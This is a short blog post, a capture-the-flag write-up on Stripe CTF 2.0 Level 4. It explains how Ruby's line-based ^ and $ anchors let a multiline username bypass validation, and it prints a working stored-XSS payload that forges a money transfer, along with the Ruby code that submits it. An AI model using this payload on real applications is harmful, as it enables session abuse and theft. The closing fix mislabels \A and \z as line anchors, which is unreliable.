Date: 2013-06-21
Title: Playing with Stripe CTF
Category: Software
Tags: ruby, security

I was playing around with Stripe's [source code][github] for last year's CTF,
and from what I could see online, most people solved Level 4 by using XSS in
the password field. But look at the following line in `srv.rb`:

    :::ruby
    unless username =~ /^\w+$/
      ie("Invalid username. Usernames must match /^\w+$/", :register)
    end

Turns out there is a hole here as well due to the way Ruby treats the `^` and
`$` metacharacters. According to the [documentation][doc], the `^` anchor
matches the beginning of a _line_, instead of the entire string. Thus

    :::ruby
    puts "match" if "<script>" =~ /^\w$/     # doesn't print anything
    puts "match" if "<script>\nx" =~ /^\w$/  #>> match

This allows us to use the `username` field as an attack vector.

    :::ruby
    xss = <<-eos
    <script>
    $.post('/transfer', { to: 'me', amount: '10' });
    </script>
    x
    eos
    Net::HTTP.post_form uri, { username: xss, password: 'x' }

Trips me up every time. Use `\A` and `\z` to match the beginning and end of a
line in ruby.

### References

- [IOActive](http://blog.ioactive.com/2012/08/stripe-ctf-20-write-up.html#level4)
- [SpiderLabs](http://blog.spiderlabs.com/2012/08/stripe-ctf-walkthrough.html)

  [doc]: http://www.ruby-doc.org/core-1.9.2/Regexp.html#label-Anchors
  [github]: https://github.com/stripe-ctf/stripe-ctf-2.0
